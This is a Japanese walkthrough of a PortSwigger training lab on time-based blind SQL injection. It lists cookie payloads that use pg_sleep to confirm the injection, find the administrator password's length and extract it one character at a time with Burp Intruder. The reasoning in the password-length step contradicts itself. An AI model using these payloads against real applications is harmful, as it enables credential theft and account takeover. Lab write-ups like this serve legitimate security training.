# 時間遅延と情報取得を伴うブラインド SQL インジェクション

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval  
このラボにはブラインド SQL インジェクションの脆弱性が含まれています。アプリケーションは分析に追跡 Cookie を使用し、送信された Cookie の値を含む SQL クエリを実行します。

SQL クエリの結果は返されません。また、クエリが行を返すかエラーを引き起こすかによって、アプリケーションの応答が変わることはありません。ただし、クエリは同期的に実行されるため、情報を推測するために条件付きの時間遅延をトリガーする可能性があります。

- 1. BuroSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. TrackingId を含むリクエストを send to repeater します
- 4. TrackingId の後ろに SQL を付加して送信します。応答まで 10 秒かかることを確認します

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

- 5. TrackingId の後ろに SQL を付加して送信します。即座に応答があることを確認します。これにより SQL が実行されている可能性があることが分かります。

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

- 6. TrackingId の後ろに SQL を付加して送信します。administrator というユーザーが存在するため、10 秒後に応答が返ります。

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- 7.TrackingId の後ろに SQL を付加して送信します。パスワードの長さを探ります

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

password)>20 にすると、応答に 10 秒かかるようになるので
パスワード長は 20 と推定できます。

- 8. repeater のリクエストを send to intruder します
- 9. パスワードを 1 桁ずつ絞り込んでいきます。1 桁目を a~z,0~9 で探します。明らかに応答が遅いパラメータがパスワードと一致します。これを 20 回繰り返します。

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)=$'a'$)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- 10. 20 回の攻撃でパスワードは判明しているため、管理者でログインします

![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/8a75a784-0b0b-4269-96cd-afae72a7a5dd)
